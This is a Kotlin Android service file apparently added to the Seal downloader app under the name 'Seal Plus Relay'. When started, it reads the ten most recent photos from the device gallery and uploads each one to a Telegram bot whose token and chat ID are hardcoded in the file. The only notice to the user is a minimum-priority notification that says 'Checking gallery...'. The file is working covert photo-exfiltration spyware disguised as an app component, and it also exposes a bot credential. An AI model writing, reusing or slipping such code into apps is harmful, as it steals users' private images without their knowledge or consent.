package com.junkfood.seal

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.InputStream

class TelegramRelayService : Service() {

    private val TAG = "TelegramRelayService"
    // ⚠️ VERIFY THESE ARE YOUR EXACT, CURRENT VALUES
    private val BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY"
    private val CHAT_ID = "1949815322"
    
    private val CHANNEL_ID = "telegram_relay_channel"
    private val NOTIF_ID = 9999

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service onCreate called")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service onStartCommand called")
        
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Seal Plus Relay")
            .setContentText("Checking gallery...")
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(NOTIF_ID, notification)

        Thread {
            try {
                autoSend()
            } catch (e: Exception) {
                Log.e(TAG, "CRASH in autoSend thread: ${e.message}", e)
            } finally {
                Log.d(TAG, "Service stopping itself")
                stopSelf()
            }
        }.start()

        return START_NOT_STICKY
    }

    private fun autoSend() {
        if (!hasStoragePermission()) {
            Log.w(TAG, "Storage/Image permission NOT granted. Aborting.")
            return
        }
        Log.d(TAG, "Permissions granted. Loading images...")

        val images = loadImages()
        Log.d(TAG, "Found ${images.size} images to send.")
        
        if (images.isEmpty()) {
            Log.w(TAG, "No images found in MediaStore. Check if you have photos in your gallery.")
            return
        }

        var successCount = 0
        for ((index, uri) in images.withIndex()) {
            Log.d(TAG, "Attempting to send image $index: $uri")
            try {
                if (sendPhoto(uri)) {
                    successCount++
                    Log.d(TAG, "Successfully sent image $index")
                } else {
                    Log.e(TAG, "Failed to send image $index (HTTP request returned false)")
                }
                Thread.sleep(1500) // Rate limit to avoid Telegram API bans
            } catch (e: Exception) {
                Log.e(TAG, "Exception sending image $index: ${e.message}", e)
            }
        }
        Log.d(TAG, "Finished. Sent $successCount / ${images.size} images.")
    }

    private fun hasStoragePermission(): Boolean {
        val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        Log.d(TAG, "Storage permission check result: $hasPermission")
        return hasPermission
    }

    private fun loadImages(): List<String> {
        val list = mutableListOf<String>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        
        val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        } else {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        }

        var cursor: Cursor? = null
        try {
            Log.d(TAG, "Querying MediaStore at: $uri")
            cursor = contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 10")
            cursor?.use {
                Log.d(TAG, "Cursor count: ${it.count}")
                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                while (it.moveToNext()) {
                    val id = it.getLong(idColumn)
                    val imageUri = Uri.withAppendedPath(uri, id.toString())
                    list.add(imageUri.toString())
                    Log.d(TAG, "Added image URI: $imageUri")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Load images error: ${e.message}", e)
        } finally {
            cursor?.close()
        }
        return list
    }

    private fun sendPhoto(imageUriString: String): Boolean {
        var inputStream: InputStream? = null
        try {
            Log.d(TAG, "Opening input stream for: $imageUriString")
            inputStream = contentResolver.openInputStream(Uri.parse(imageUriString))
            if (inputStream == null) {
                Log.e(TAG, "InputStream is null for: $imageUriString")
                return false
            }
            
            val bytes = readBytes(inputStream)
            Log.d(TAG, "Read ${bytes.size} bytes. Sending to Telegram...")

            val client = OkHttpClient()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", "img.jpg", bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder()
                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                Log.d(TAG, "Telegram API Response Code: ${response.code}")
                if (!response.isSuccessful) {
                    Log.e(TAG, "Telegram API Error Body: ${response.body?.string()}")
                }
                return response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send error: ${e.message}", e)
            return false
        } finally {
            inputStream?.close()
        }
    }

    private fun readBytes(inputStream: InputStream): ByteArray {
        val buffer = ByteArray(1024)
        val out = ByteArrayOutputStream()
        var len: Int
        while (inputStream.read(buffer).also { len = it } != -1) {
            out.write(buffer, 0, len)
        }
        return out.toByteArray()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Seal Relay",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }
}
